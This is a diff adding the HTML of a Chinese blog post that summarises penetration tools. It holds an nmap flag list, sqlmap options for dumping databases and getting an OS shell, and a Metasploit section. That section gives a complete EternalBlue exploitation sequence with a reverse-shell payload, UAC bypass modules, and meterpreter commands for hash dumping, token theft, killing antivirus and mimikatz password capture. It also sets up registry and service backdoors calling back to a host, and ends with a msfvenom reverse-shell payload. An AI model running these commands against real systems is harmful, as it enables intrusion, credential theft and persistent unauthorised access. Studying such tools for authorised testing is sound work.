@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="nmap123456789101112-O 扫描操作系统-sT TCP连接-sS SYN扫描-sA ACK扫描-sP Ping扫描-sU UDP扫描-sV 服务版本扫描-sN 空扫描-Pn 禁ping扫描-iL 指定文件，扫描文件中所有IP-oA 指定文件，输出结果，xml,nmap,gnmap三种结果-p 22-443 指定端口22到443  sqlmap12345678910111213141">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透工具基础总结">
+<meta property="og:url" content="https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="sh1xo&#39;s Blog">
+<meta property="og:description" content="nmap123456789101112-O 扫描操作系统-sT TCP连接-sS SYN扫描-sA ACK扫描-sP Ping扫描-sU UDP扫描-sV 服务版本扫描-sN 空扫描-Pn 禁ping扫描-iL 指定文件，扫描文件中所有IP-oA 指定文件，输出结果，xml,nmap,gnmap三种结果-p 22-443 指定端口22到443  sqlmap12345678910111213141">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-05-01T14:07:26.000Z">
+<meta property="article:modified_time" content="2022-04-16T14:10:13.073Z">
+<meta property="article:author" content="sh1xo">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>渗透工具基础总结</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">sh1xo&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/04/16/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&text=渗透工具基础总结"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&is_video=false&description=渗透工具基础总结"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透工具基础总结&body=Check out this article: https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&name=渗透工具基础总结&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap"><span class="toc-number">2.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf"><span class="toc-number">3.</span> <span class="toc-text">msf</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透工具基础总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">sh1xo's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2022-05-01T14:07:26.000Z" itemprop="datePublished">2022-05-01</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-O 扫描操作系统</span><br><span class="line">-sT TCP连接</span><br><span class="line">-sS SYN扫描</span><br><span class="line">-sA ACK扫描</span><br><span class="line">-sP Ping扫描</span><br><span class="line">-sU UDP扫描</span><br><span class="line">-sV 服务版本扫描</span><br><span class="line">-sN 空扫描</span><br><span class="line">-Pn 禁ping扫描</span><br><span class="line">-iL 指定文件，扫描文件中所有IP</span><br><span class="line">-oA 指定文件，输出结果，xml,nmap,gnmap三种结果</span><br><span class="line">-p 22-443 指定端口22到443</span><br></pre></td></tr></table></figure>
+
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">-u 指定url</span><br><span class="line">-r 指定包含http数据包的文件</span><br><span class="line">--cookie 指定cookie</span><br><span class="line">--dbs 获取所有数据库名</span><br><span class="line">--current-db 获取当前数据库</span><br><span class="line">--current-user 获取当前用户名</span><br><span class="line">--is-dba</span><br><span class="line"></span><br><span class="line">--tables 获取指定数据库所有表名</span><br><span class="line">--columns 获取指定数据库，表的所有列名</span><br><span class="line">--dump 获取指定数据，表，列的数据</span><br><span class="line">-D 指定数据库</span><br><span class="line">-T 指定表</span><br><span class="line">-C 指定列</span><br><span class="line"></span><br><span class="line">--tamper 设置tamper脚本</span><br><span class="line"></span><br><span class="line">--technique B 布尔盲注</span><br><span class="line">--technique E 报错注入</span><br><span class="line">--technique U union查询注入</span><br><span class="line">--technique S 堆叠注入</span><br><span class="line">--technique T 时间盲注</span><br><span class="line">--technique Q 内联查询注入</span><br><span class="line">--time-sec 指定时间盲注时间</span><br><span class="line"></span><br><span class="line">--sql-shell 执行指定sql语句</span><br><span class="line">--os-shell  执行系统命令，本质上是上传了webshell</span><br><span class="line"></span><br><span class="line">--file-read 读取指定路径文件内容</span><br><span class="line">--file-write --file-dest 上传指定文件到指定目录</span><br><span class="line"></span><br><span class="line">--proxy 设置代理</span><br><span class="line"></span><br><span class="line">--delay 延时</span><br><span class="line"></span><br><span class="line">-p 指定检测的参数</span><br><span class="line"></span><br><span class="line">--level 共5个等级，&gt;=2时测试cookie，&gt;=3时测试user-agent和referer，=5时测试host，xff等</span><br><span class="line"></span><br><span class="line">--banner 检测操作系统信息，服务器版本，数据库版本，语言</span><br></pre></td></tr></table></figure>
+
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><ul>
+<li><p>基本漏洞攻击流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">漏洞攻击</span><br><span class="line">search ms17-010</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">show payloads</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set RHOST 192.168.125.138</span><br><span class="line">set LHOST 192.168.125.129</span><br><span class="line">set LPORT 2333</span><br><span class="line">run</span><br><span class="line">  </span><br><span class="line">常用uac提权</span><br><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/ask</span><br><span class="line">  </span><br><span class="line">反弹shell监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.125.129</span><br><span class="line">set LPORT 2333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>meterpreter</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">hell #切换到目标主机命令行</span><br><span class="line">exit #退出目标主机命令行，返回meterpreter</span><br><span class="line">background #退出meterpreter，返回到msfconsole</span><br><span class="line">sessions -l #查看所有获得的shell</span><br><span class="line">sessions -i n #切换到id为n的shell</span><br><span class="line"></span><br><span class="line">sysinfo #查看目标主机的信息</span><br><span class="line">migrate pid #进程迁移</span><br><span class="line">download src dst #下载文件</span><br><span class="line">upload src dst #上传文件</span><br><span class="line">portfwd add -l 2333 -r 内网其他主机IP -p 3389 #端口转发</span><br><span class="line">search -d c:\ -f *cmd.exe #搜索特定文件</span><br><span class="line">hashdump #获得账户密码hash值</span><br><span class="line">steal_token pid   #从指定进程中窃取token</span><br><span class="line">drop_token #放弃窃取的token</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate           #自动进程迁移</span><br><span class="line">run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上</span><br><span class="line">run post/windows/manage/killav            #关闭杀毒软件</span><br><span class="line">run post/windows/manage/enable_rdp        #开启远程桌面服务</span><br><span class="line">run post/windows/manage/autoroute         #查看路由信息</span><br><span class="line">run post/windows/gather/enum_logged_on_users    #列举当前登录的用户</span><br><span class="line">run post/windows/gather/enum_applications       #列举应用程序</span><br><span class="line">run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码</span><br><span class="line">run post/windows/gather/smart_hashdump               #dump出所有用户的hash</span><br><span class="line">run post/windows/gather/arp_scanner #内网主机ARP扫描</span><br><span class="line">run auxiliary/scanner/portscan/tcp #主机端口扫描</span><br><span class="line">run post/windows/gather/enum_patches #查看补丁信息</span><br><span class="line"></span><br><span class="line">execute  #执行可执行文件</span><br><span class="line">-f：指定可执行文件</span><br><span class="line">-H：创建一个隐藏进程</span><br><span class="line">-a：传递给命令的参数</span><br><span class="line">-i： 跟进程进行交互</span><br><span class="line">-m：从内存中执行</span><br><span class="line">-t： 使用当前伪造的线程令牌运行进程</span><br><span class="line">-s： 在给定会话中执行进程</span><br><span class="line"></span><br><span class="line">抓包</span><br><span class="line">load sniffer         #加载第三方工具</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2      #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2      #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lab1.pcap  #导出pcap数据包</span><br><span class="line">sniffer_release 2              #释放接口上抓取的数据包</span><br><span class="line">sniffer_stop 2                 #停止抓包</span><br><span class="line"></span><br><span class="line">密码抓取</span><br><span class="line">load kiwi    #加载mimikatz模块</span><br><span class="line">kiwi_cmd sekurlsa::wdigest #抓取明文密码</span><br><span class="line"></span><br><span class="line">设置注册表后门</span><br><span class="line">run persistence -U -i 5 -p 4444 -r 192.33.6.150 -L c:\Windows\System32</span><br><span class="line">-U：设置后门在用户登录后自启动。该方式会在HKCU/Software/Microsoft/Windows/CurrentVersion/Run下添加注册表信息</span><br><span class="line">-X：设置后门在系统启动后自启动。该方式会在HKLM/Software/Microsoft/Windows/CurrentVersion/Run下添加注册表信息,需要system权限</span><br><span class="line">-L：后门传到远程主机的位置,上传的是一个vbs文件</span><br><span class="line">-i：设置反向连接间隔时间</span><br><span class="line">-P：默认载荷 windows/meterpreter/reverse_tcp</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的ip地址</span><br><span class="line"></span><br><span class="line">设置服务后门</span><br><span class="line">run metsvc -A #安装</span><br><span class="line">run metsvc -r #卸载</span><br><span class="line"></span><br><span class="line">主动连接服务后门</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>msfvenom</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.221.1 LPORT=2333 -f c -o   1.c</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap"><span class="toc-number">2.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf"><span class="toc-number">3.</span> <span class="toc-text">msf</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&text=渗透工具基础总结"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&is_video=false&description=渗透工具基础总结"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透工具基础总结&body=Check out this article: https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&title=渗透工具基础总结"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sh1xo.cn/2022/05/01/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/&name=渗透工具基础总结&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2022 sh1xo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
